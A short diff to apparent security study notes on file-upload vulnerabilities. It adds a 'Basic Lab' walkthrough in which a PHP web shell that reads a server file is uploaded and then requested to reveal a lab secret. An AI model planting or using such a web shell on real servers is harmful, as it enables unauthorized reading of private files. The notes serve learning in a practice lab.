@@ -16,3 +16,10 @@ If you're able to successfully upload a web shell, you effectively have full con
 <?php echo file_get_contents('/path/to/target/file'); ?>
 ```
 Once uploaded, sending a request for this malicious file will return the target file's contents in the response.
+
+
+# Basic Lab
+
+1) Shell php file `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+2) After uploading browse to that file according to name
+3) Then content of secret file will be revealed.
